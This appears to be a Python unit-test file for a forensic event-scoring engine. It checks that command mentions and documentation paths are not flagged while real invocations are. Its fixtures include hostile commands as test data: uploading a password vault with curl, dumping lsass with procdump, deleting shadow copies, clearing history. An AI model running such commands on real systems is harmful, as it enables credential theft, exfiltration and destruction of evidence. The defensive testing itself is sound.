"""v25 semantic boundaries: mention != invocation != successful outcome."""
import json
from dataclasses import replace
import logging
from pathlib import Path
import tempfile
import unittest

import pandas as pd
import pyarrow as pa
import pyarrow.parquet as pq
import yaml

import chronoSIFT_v2_31 as c
from command_evidence import command_invocations
from benchmarks.build_semantic_evidence_policy import build, render
from configure_web_roots import configure_web_roots

ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT/'rules/rules_evidence_calibrated_v25.yaml'
WEIGHTS = ROOT/'rules/weights_evidence_calibrated_v21.yaml'


def fs(path, **extra):
    return dict(dict(parser='filestat', filename=path, file_entry_type='file', timestamp_desc='Creation Time'), **extra)


def log(message, **extra):
    return dict(dict(parser='text/syslog_traditional', message=message), **extra)


def hist(command):
    return dict(parser='text/bash_history', message=command, command_line=command)


def signals(row):
    value = row.get('chronosift_signals')
    return value if isinstance(value, dict) else {}


class SemanticEvidenceTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.temp = tempfile.TemporaryDirectory()
        cls.metadata = Path(cls.temp.name)/'fixture.yar'
        cls.metadata.write_text('rule TEST_WEBSHELL_Strong {\nmeta:\n score = 75\n quality = 85\ncondition:\n false\n}\n')
        cls.level = logging.getLogger().level
        logging.getLogger().setLevel(logging.ERROR)
        cls.engine = c.ChronoSiftEngine.from_yaml(RULES,WEIGHTS,yara_metadata_path=str(cls.metadata))

    @classmethod
    def tearDownClass(cls):
        cls.temp.cleanup()
        logging.getLogger().setLevel(cls.level)

    def rows(self, *records, engine=None, file_hit_manifest=None):
        frame = pd.DataFrame([dict(chronosift_row_id=900+i, hostname='fixture-host', **record)
            for i,record in enumerate(records)], index=pd.date_range('2024-06-30T23:59:00Z', periods=len(records),freq='min', name='datetime'))
        out = (engine or self.engine).apply(frame, apply_profiling=False,file_hit_manifest=file_hit_manifest)
        self.assertEqual(list(out.chronosift_row_id), list(range(900,900+len(records))))
        self.assertEqual(list(out.index), list(frame.index))
        for _, row in out.iterrows():
            items = row.get('chronosift_explain')
            if not isinstance(items,list): items=[]
            self.assertAlmostEqual(row.chronosift_score,min(50,sum(x['score_contribution'] for x in items)))
        return out

    def test_builder_fidelity_and_unchanged_weights(self):
        self.assertEqual(RULES.read_text(),render()['rules/rules_evidence_calibrated_v25.yaml'])
        import hashlib
        self.assertEqual(hashlib.sha256(WEIGHTS.read_bytes()).hexdigest(),'d0c910d7a030c89a5f8745b6a6eb91a99071bcfe1ba125636d907b65123a49b8')
        from benchmarks.build_attack_metadata_policy import matrix
        self.assertEqual(matrix(build(),25),(ROOT/'docs/ATTACK_MATRIX_V25.md').read_text())

    def test_content_qualified_webshell_and_sensitive_download_survive(self):
        request=lambda path:dict(parser='apache_access',http_request=f'GET {path} HTTP/1.1',http_response_code=200,http_response_bytes=30000000)
        rows=self.rows(fs('/var/www/html/DVWA/hackable/uploads/Utility.php',yara_match=['TEST_WEBSHELL_Strong']),
            request('/DVWA/hackable/uploads/Utility.php'))
        self.assertIn('webshell_artifact',signals(rows.iloc[0]))
        self.assertIn('webshell_activity',signals(rows.iloc[1]))
        records=[fs('/var/www/html/export.dat',luhn_hit=True),request('/export.dat')]
        with tempfile.TemporaryDirectory() as directory:
            data=pd.DataFrame(records,index=pd.date_range('2024-06-30T23:59:00Z',periods=2,freq='min',name='datetime'))
            data.to_parquet(Path(directory)/'fixture.parquet')
            manifest=c.build_global_referenced_file_hit_manifest(directory,
                yara_metadata_index=self.engine.yara_metadata_index,yara_metadata_path=str(self.metadata),
                clamav_classifier_policy=self.engine.detector_policy.clamav_classification,
                yara_classifier_policy=self.engine.detector_policy.yara_classification,
                referenced_file_policy=self.engine.detector_policy.referenced_file_correlation)
            rows=self.rows(*records,file_hit_manifest=manifest)
        self.assertIn('referenced_file_luhn_hit',signals(rows.iloc[1]))
        self.assertGreater(rows.iloc[1].chronosift_score,0)

    def test_native_compact_and_expanded_partition_parity(self):
        records=[hist('curl https://example.org/help'),fs('/usr/share/doc/pkg_dump.cc.gz'),
            fs('/home/operator/secrets.kdbx'),hist('tar -cf /tmp/stage.tar /home/operator/secrets.kdbx')]
        data=pd.DataFrame([dict(chronosift_row_id=990+i,hostname='fixture-host',**record) for i,record in enumerate(records)],
            index=pd.date_range('2024-06-30T23:58:00Z',periods=4,freq='min',name='datetime'))
        with tempfile.TemporaryDirectory() as directory:
            root=Path(directory);c.write_time_partitioned_parquet(data,str(root/'input'),normalise=False)
            outputs=[]
            for compact in (False,True):
                engine=c.ChronoSiftEngine.from_yaml(RULES,WEIGHTS,yara_metadata_path=str(self.metadata))
                engine.partition_execution_policy={**engine.partition_execution_policy,'compact_history':compact}
                engine.profiling_policy=replace(engine.profiling_policy,enabled=False)
                reports=engine.process_parquet_dataset_partitioned(str(root/'input'),str(root/str(compact)),output_mode='sidecar',materialise_event_columns=True)
                self.assertEqual(sum(item['rows_written'] for item in reports),4)
                out=c.load_plaso_parquet_dataset(str(root/str(compact))).set_index('chronosift_row_id').sort_index()
                self.assertEqual(list(out.index),[990,991,992,993])
                for _,row in out.iterrows():
                    values=row.get('chronosift_explain')
                    values=[] if values is None or values is pd.NA else [json.loads(x) if isinstance(x,str) else x for x in values]
                    self.assertAlmostEqual(row.chronosift_score,min(50,sum(item.get('score_contribution',0) for item in values)))
                outputs.append(out)
            self.assertEqual(outputs[0].chronosift_score.tolist(),outputs[1].chronosift_score.tolist())
            for out in outputs:
                self.assertNotIn('database_dump_candidate',out.loc[991].chronosift_signals or {})
                self.assertIn('password_store_exfil_chain',out.loc[992].chronosift_signals)

    def test_command_mentions_are_not_invocations(self):
        for command in ['echo python /opt/manual.txt','/usr/bin/python-report --help','echo bash',
                'echo gcc','echo chmod u+s /tmp/example','echo curl https://example.org/help',
                'echo "curl https://example.org/help; chmod u+s /tmp/example"',
                'printf "%s" "bash"','chown root:root /opt/service/config.txt']:
            with self.subTest(command=command):
                row=self.rows(hist(command)).iloc[0]
                for name in ('interpreter_exec_linux','lolbin_linux','exec_shell_spawn','exec_compiler_activity',
                    'exec_new_suid_binary','data_transfer_tool_exec','exec_network_tool'):
                    self.assertNotIn(name,signals(row))

    def test_literal_invocations_wrappers_and_chains(self):
        for command in ['python3 /opt/job.py','/usr/bin/python3 /opt/job.py','"/usr/bin/python3" /opt/job.py',
                'sudo -u root /usr/bin/python3 /opt/job.py','env MODE=on python3 /opt/job.py',
                'nohup python3 /opt/job.py','echo ready && python3 /opt/job.py',"bash -c 'python3 /opt/job.py'"]:
            with self.subTest(command=command):
                self.assertIn('interpreter_exec_linux',signals(self.rows(hist(command)).iloc[0]))
        for command in ['chmod u+s /tmp/example','chmod 4755 /tmp/example','chmod 6755 /tmp/example','chmod g+s /tmp/example','chmod 2755 /tmp/example']:
            with self.subTest(command=command):
                self.assertIn('exec_new_suid_binary',signals(self.rows(hist(command)).iloc[0]))
        self.assertNotIn('exec_new_suid_binary',signals(self.rows(hist('chmod 0755 /tmp/example')).iloc[0]))

    def test_quoted_or_malformed_command_syntax_is_not_executed(self):
        self.assertEqual(command_invocations('echo "a; bash"'), 'echo "a; bash"')
        self.assertIsNone(command_invocations('"unterminated bash'))
        self.assertEqual(command_invocations('echo $(curl https://example.org)'), 'echo $(curl https://example.org)')
        self.assertEqual(command_invocations('echo $(echo ignored; curl https://example.org)'), 'echo $(echo ignored; curl https://example.org)')
        self.assertEqual(command_invocations('echo ok # documentation; curl https://example.org'), 'echo ok')
        self.assertEqual(command_invocations('# example; curl https://example.org\npython3 job.py'), 'python3 job.py')
        self.assertEqual(command_invocations(r'"C:\Windows\System32\cmd.exe" /c echo ok'), 'cmd.exe /c echo ok')

    def test_document_and_substring_paths_do_not_claim_behaviour(self):
        examples = [
            (fs('/usr/share/doc/aptitude/examples/pkg_hier_dump.cc.gz'),'database_dump_candidate'),
            (fs('/home/operator/.local/application/state.db'),'database_dump_candidate'),
            (fs('/usr/share/doc/real-time protection disabled.txt'),'defender_disabled'),
            (log('Test passed: real-time protection disabled was NOT observed'),'defender_disabled'),
            (fs('/usr/share/doc/backup-guide.txt',message='Tutorial example: vssadmin delete shadows'),'inhibit_system_recovery'),
            (fs('/usr/share/doc/shell-guide.txt',message='Tutorial example: history -c'),'indicator_removal_on_host'),
            (fs('/usr/share/doc/service-guide.txt',message='Tutorial example: systemctl stop demo'),'service_stop'),
            (fs('/usr/share/doc/renderer-guide.txt',message='Documentation: renderer minidump format'),'credential_dumping'),
            (fs('/usr/share/doc/lsass-explanation.txt'),'credential_dumping'),
            (fs('/usr/share/doc/vault-guide.txt'),'password_store_access'),
            (fs('/ROOT/.config/google-chrome/Default/Login Data'),'password_store_access'),
            (fs('/usr/share/doc/id_rsa-guide.txt'),'sensitive_file_access'),
            (fs('/home/operator/project/policies/privacy.txt'),'group_policy_modified'),
            (fs('/usr/share/doc/ssh/examples/authorized_keys'),'authorized_keys_persistence'),
            (fs('/home/operator/project/root/authorized_keys'),'authorized_keys_root_persistence'),
            (fs('/home/operator/examples/var/www/html/help.php'),'web_executable_created'),
            (fs('/home/operator/report.zip',timestamp_desc='Access Time',file_size=30*1024*1024),'large_archive_created'),
            (dict(parser='winreg_default',image_path=r'C:\Documents\powershell.exe-guide.txt'),'lolbin_windows'),
        ]
        for record, signal in examples:
            with self.subTest(record=record,signal=signal):
                self.assertNotIn(signal,signals(self.rows(record).iloc[0]))

    def test_positive_locations_and_attempts_remain(self):
        examples = [
            (fs('/var/www/html/archive.sql'),'database_dump_candidate'),
            (fs('/root/.ssh/authorized_keys'),'authorized_keys_root_persistence'),
            (fs('/home/operator/.ssh/authorized_keys'),'authorized_keys_persistence'),
            (fs('/etc/shadow'),'sensitive_file_access'),
            (fs('/home/operator/secrets.kdbx'),'password_store_access'),
            (fs('/home/operator/.config/google-chrome/Default/Login Data'),'password_store_access'),
            (fs(r'C:\Users\operator\AppData\Local\Google\Chrome\User Data\Default\Login Data'),'password_store_access'),
            (fs(r'C:\Windows\System32\GroupPolicy\Machine\Registry.pol'),'group_policy_modified'),
            (hist('vssadmin delete shadows'),'inhibit_system_recovery'),
            (hist('history -c'),'indicator_removal_on_host'),
            (hist('systemctl stop demo'),'service_stop'),
            (hist('procdump -ma lsass.exe /tmp/capture.bin'),'credential_dumping'),
            (hist('curl --upload-file /tmp/staging.zip ftp://example.org/'),'data_transfer_tool_exec'),
            (fs('/tmp/capture.bin',artifact_type='process_memory_dump',target_process_name='lsass.exe'),'credential_dumping'),
            (fs('/home/operator/report.zip',file_size=30*1024*1024),'large_archive_created'),
            (dict(parser='winevtx',provider_name='Microsoft-Windows-Windows Defender',event_identifier=5001),'defender_disabled'),
        ]
        for record, signal in examples:
            with self.subTest(record=record,signal=signal):
                self.assertIn(signal,signals(self.rows(record).iloc[0]))

    def test_account_manual_errors_attempt_and_outcome(self):
        for message in ['[(process] 17622): getfattr: ./usr/share/man/pt/man8/addgroup.8.gz: Operation not supported',
                'getfattr: ./usr/share/man/man8/userdel.8.gz: Operation not supported']:
            row = self.rows(log(message)).iloc[0]
            self.assertNotIn('account_or_group_change',signals(row))
            self.assertNotIn('account_access_removal',signals(row))
        row=self.rows(log('useradd[42]: cannot lock /etc/passwd; try again later.')).iloc[0]
        self.assertIn('account_or_group_change',signals(row))
        self.assertNotIn('account_created',signals(row))
        row=self.rows(log('[useradd, pid: 2053] new user: name=renamed, UID=1003, GID=1003, home=/home/renamed, shell=/bin/bash')).iloc[0]
        self.assertIn('account_created',signals(row))
        self.assertIn('account_or_group_change',signals(row))
        self.assertIn('account_access_removal',signals(self.rows(hist('userdel renamed')).iloc[0]))
        self.assertIn('account_access_removal',signals(self.rows(log('userdel[42]: cannot lock /etc/passwd; try again later.')).iloc[0]))
        self.assertNotIn('account_access_removal',signals(self.rows(log("usermod[42]: change user 'renamed' shell from '/bin/sh' to '/bin/bash'")).iloc[0]))

    def test_auth_docs_cannot_seed_success_failure_or_temporal_chain(self):
        rows=self.rows(log('pam_unix(login:auth): authentication failure',actor_user='operator'),
            fs('/usr/share/doc/login-guide.txt',message='Documentation: session opened for user operator',actor_user='operator'),
            fs('/usr/share/doc/login-guide.txt',message='Documentation: sshd failed password example',actor_user='operator'))
        self.assertIn('auth_local_failure',signals(rows.iloc[0]))
        for _,row in rows.iloc[1:].iterrows():
            self.assertFalse(any(name.startswith(('auth_','ssh_','local_fail')) for name in signals(row)))
        self.assertIn('auth_success',signals(self.rows(log('sshd[42]: Accepted password for operator from 192.0.2.10 port 2222 ssh2')).iloc[0]))
        self.assertIn('auth_local_success',signals(self.rows(log('pam_unix(login:session): session opened for user operator by (uid=0)')).iloc[0]))

    def test_transfer_documentation_and_backup_suffix(self):
        for parser in ('syslog','text/syslog_traditional','filestat'):
            row=self.rows(dict(parser=parser,message='updater: curl documentation is available at https://example.org/help')).iloc[0]
            self.assertNotIn('data_transfer_tool_exec',signals(row))
        a=self.rows(hist('tar -cf /tmp/staging.zip /srv/research')).iloc[0]
        b=self.rows(hist('tar -cf /tmp/staging.dat /srv/research')).iloc[0]
        self.assertEqual(a.chronosift_score,b.chronosift_score)
        self.assertGreater(a.chronosift_score,0)

    def test_follow_on_requires_actual_full_file_reference(self):
        for following in [fs('/tmp/vault-backup.tar'),hist('tar -cf /tmp/out.tar /tmp/different.kdbx'),
                hist('tar -cf /tmp/out.tar /home/operator/Secrets.kdbx'),
                hist('echo cp /home/operator/secrets.kdbx /tmp/copy.kdbx'),
                hist('tar -cf /tmp/out.tar /tmp/plain.txt; echo /home/operator/secrets.kdbx'),
                hist('curl -H "X-Example: /home/operator/secrets.kdbx" https://example.org')]:
            row=self.rows(fs('/home/operator/secrets.kdbx'),following).iloc[0]
            self.assertNotIn('password_store_exfil_chain',signals(row))
        for command in ['tar -cf /tmp/out.tar /tmp/plain.txt; echo /home/operator/secrets.kdbx',
                'curl -H "X-Example: /home/operator/secrets.kdbx" https://example.org',
                'echo cp /home/operator/secrets.kdbx /tmp/copy.kdbx']:
            self.assertNotIn('password_store_access',signals(self.rows(hist(command)).iloc[0]))
        row=self.rows(fs('/home/operator/secrets.kdbx'),hist('tar -cf /tmp/out.tar /home/operator/secrets.kdbx')).iloc[0]
        self.assertIn('password_store_exfil_chain',signals(row))
        row=self.rows(fs('/home/operator/my secrets.kdbx'),hist('tar -cf /tmp/out.tar "/home/operator/my secrets.kdbx"')).iloc[0]
        self.assertIn('password_store_exfil_chain',signals(row))
        row=self.rows(fs(r'C:\Users\operator\AppData\Local\Google\Chrome\User Data\Default\Login Data'),
            hist(r'cp "c:\users\OPERATOR\AppData\Local\Google\Chrome\User Data\Default\Login Data" /tmp/stage.db')).iloc[0]
        self.assertIn('password_store_exfil_chain',signals(row))
        row=self.rows(fs('/home/operator/secrets.kdbx'),hist('curl --upload-file /home/operator/secrets.kdbx ftp://example.org')).iloc[0]
        self.assertIn('password_store_exfil_chain',signals(row))

    def test_shared_signal_has_one_contribution_owner_native_and_json(self):
        row=self.rows(hist('curl https://example.org/help')).iloc[0]
        items=[x for x in row.chronosift_explain if x['rule_id'].startswith('DATA_TRANSFER_TOOL_EXEC')]
        self.assertEqual(len(items),2)
        self.assertEqual(sorted(x['score_contribution'] for x in items),[0,6])
        details=[signal for item in items for signal in item['signals']]
        self.assertEqual(sorted(x['contribution_role'] for x in details),['owner','supporting'])
        self.assertEqual(len({x['contribution_owner'] for x in details}),1)
        path=Path(self.temp.name)/'explanations.parquet'
        pq.write_table(pa.Table.from_pylist([dict(explanations=row.chronosift_explain)]),path)
        def without_null_padding(value):
            if isinstance(value,dict): return {k:without_null_padding(v) for k,v in value.items() if v is not None}
            if isinstance(value,list): return [without_null_padding(v) for v in value]
            return value
        self.assertEqual(without_null_padding(pq.read_table(path).to_pylist()[0]['explanations']),without_null_padding(row.chronosift_explain))
        self.assertEqual(json.loads(json.dumps(row.chronosift_explain)),row.chronosift_explain)

    def test_privilege_is_still_additive_not_duplicate(self):
        row=self.rows(dict(parser='winevtx',source_name='Microsoft-Windows-Security-Auditing',
            event_identifier=4733,target_user_name='Administrators')).iloc[0]
        self.assertEqual(row.chronosift_score,8)
        self.assertEqual(sorted(x['score_contribution'] for x in row.chronosift_explain if x['score_contribution']),[2,6])

    def test_custom_root_updates_anchored_lifecycle_matching(self):
        doc=build();configure_web_roots(doc,['/srv/application/public'])
        engine=c.ChronoSiftEngine(doc,yaml.safe_load(WEIGHTS.read_text()),yara_metadata_path=str(self.metadata))
        rows=self.rows(fs('/srv/application/public/data.sql'),fs('/home/demo/srv/application/public/data.sql'),engine=engine)
        self.assertIn('database_dump_candidate',signals(rows.iloc[0]))
        self.assertNotIn('database_dump_candidate',signals(rows.iloc[1]))


if __name__=='__main__': unittest.main()
